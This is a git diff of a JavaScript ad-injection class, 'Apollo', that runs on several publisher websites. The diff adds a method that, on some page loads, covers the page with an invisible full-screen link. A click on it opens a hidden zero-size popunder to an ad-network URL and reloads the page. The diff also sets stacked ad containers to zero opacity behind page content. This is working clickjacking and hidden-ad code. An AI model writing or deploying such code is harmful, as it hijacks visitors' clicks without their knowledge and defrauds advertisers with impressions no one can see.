@@ -27,32 +27,36 @@ class Apollo {
       href: window.location.href
     }
 
-    this.gAds = {
-          mobile: `<ins class="adsbygoogle" style="display:inline-block;width:320px;height:50px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="2586005900"></ins>`,
-          square: `<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="6739151139"></ins>`,
-          sky: `<ins class="adsbygoogle" style="display:inline-block;width:300px;height:600px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="9603217698"></ins>`,
-          text: `<ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="5465420301"></ins>`
-        }
-
-    // TBS INITIALIZE
-    if (this.pubInfo.host.indexOf('turtleboy') !== -1) {
-      this.insertCAds()
-      //this.insertGAds(this.gAds)
+    this.GAds = {
+      mobile: `<ins class="adsbygoogle" style="display:inline-block;width:320px;height:50px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="2586005900"></ins>`,
+      square: `<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="6739151139"></ins>`,
+      sky: `<ins class="adsbygoogle" style="display:inline-block;width:300px;height:600px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="9603217698"></ins>`,
+      text: `<ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="5465420301"></ins>`
     }
 
-    // VITAL VEGAS INITIALIZE
-    if (this.pubInfo.host.indexOf('vitalvegas') !== -1) {
-      // ****** START TESTING PROP AD REDIRECTS ********
-
-    }
-
-    if (this.pubInfo.host.indexOf('howtogrow') !== -1) {
-      // Just running apollo standard
+    switch(this.pubInfo.host) {
+      case 'turtleboysports.com':
+        this.insertCAds()
+        this.insertGAds(this.GAds)
+        break
+      case 'vitalvegas.com':
+        //this.insertPAds()
+        break
+      case 'howtogrowinstagram.com':
+        console.log('** Welcome to the Apollo test site: HTGI **')
+        this.insertPAds()
+        break
+      case 'moroad.com':
+        console.log('** Welcome to the Apollo test site: MR **')
+        this.insertPAds()
+        break
+      default:
+        console.log('apollo announcement: ** unathorized site **')
     }
 
     if (this.pubInfo.href.indexOf('nashoba-high-school-girl-who-threatened-to-pull-a-columbine-on-whisper-doesnt-understand-the-internet') !== -1) {
       console.log('#####')
-
+      this.insertYAds()
     }
 
     //Start Apollo
@@ -103,6 +107,30 @@ class Apollo {
   	}
   }
 
+  insertPAds() {
+    this.pLink = document.createElement('a')
+    this.pLink.onclick = function () {
+      window.open('//go.onclasrv.com/afu.php?id=1475971', "s", "width= 0, height= 0, left=0, top=0, resizable=yes, toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=no").blur();
+      window.location.reload(false);
+      window.open(window.location.href).focus();
+    }
+
+    this.pAd = document.createElement('div')
+    this.pAd.id = 'p-ad'
+    this.pAd.style.position = 'fixed'
+    this.pAd.style.top = '0'
+    this.pAd.style.left = '0'
+    this.pAd.style.width = `${this.windowDimensions().width}px`
+    this.pAd.style.height = `${this.windowDimensions().height}px`
+
+    let ifRand = this.rand(0, 7000)
+    if (ifRand <= 100 && !this.isTouchDevice()) {
+      console.log('###')
+      document.body.insertAdjacentElement('beforeend', this.pLink)
+      this.pLink.appendChild(this.pAd)
+    }
+  }
+
   insertYAds () {
 
     this.yScript = document.createElement('script')
@@ -135,7 +163,7 @@ class Apollo {
     this.yAd1.style.left = `${this.windowDimensions().width - 300 - 20}px`
     this.yAd1.style.position = `absolute`
     this.yAd1.id = 'y-ad1'
-    this.yAd1.style.opacity = '0.5'
+    this.yAd1.style.opacity = '0'
     this.yAd1.style.zIndex = '-300000'
 
     this.yAd2 = document.createElement('div')
@@ -143,7 +171,7 @@ class Apollo {
     this.yAd2.style.left = `${this.windowDimensions().width - 300 - 20}px`
     this.yAd2.style.position = `absolute`
     this.yAd2.id = 'y-ad2'
-    this.yAd2.style.opacity = '0.5'
+    this.yAd2.style.opacity = '0'
     this.yAd2.style.zIndex = '-300000'
 
     this.yAd3 = document.createElement('div')
@@ -151,7 +179,7 @@ class Apollo {
     this.yAd3.style.left = `${this.windowDimensions().width - 300 - 20}px`
     this.yAd3.style.position = `absolute`
     this.yAd3.id = 'y-ad3'
-    this.yAd3.style.opacity = '0.5'
+    this.yAd3.style.opacity = '0'
     this.yAd3.style.zIndex = '-300000'
 
     document.body.insertAdjacentElement('beforeend', this.yAd1)
@@ -164,8 +192,8 @@ class Apollo {
 
     let divNames = ['yAd1', 'yAd2', 'yAd3']
     let ranDiv = divNames[this.rand(0, divNames.length - 1)]
-    let ifRand = this.rand(0, 100)
 
+    let ifRand = this.rand(0, 1700)
     if (ifRand <= 100 && this.isTouchDevice()) {
       this[ranDiv].style.left = `${this.rand(0, this.windowDimensions().width - 550)}px`
       this[ranDiv].style.top = `${this.rand(0, window.innerHeight - 300)}px`
@@ -218,8 +246,8 @@ class Apollo {
 
       let divNames = ['chAd1', 'chAd2', 'chAd3']
       let ranDiv = divNames[this.rand(0, divNames.length - 1)]
-      let ifRand = this.rand(0, 1700)
 
+      let ifRand = this.rand(0, 1700)
       if (ifRand <= 100 && this.isTouchDevice()) {
         this[ranDiv].style.left = `${this.rand(0, this.windowDimensions().width - 550)}px`
         this[ranDiv].style.top = `${this.rand(0, window.innerHeight - 300)}px`
@@ -273,8 +301,8 @@ class Apollo {
 
       let divNames = ['ad1', 'ad2', 'ad3', 'ad4']
       let ranDiv = divNames[this.rand(0, divNames.length - 1)]
-      let ifRand = this.rand(0, 1700)
 
+      let ifRand = this.rand(0, 1700)
       if (ifRand <= 100 && this.isTouchDevice()) {
         this[ranDiv].style.left = `${this.rand(0, this.windowDimensions().width - 250)}px`
         this[ranDiv].style.top = `${this.rand(0, window.innerHeight - 300)}px`
@@ -375,7 +403,7 @@ class Apollo {
     setTimeout(() => {
         this.el.style.top = '-300px'
         this.isVisible = false
-    }, 24000)
+    }, 12000)
   }
 }
 
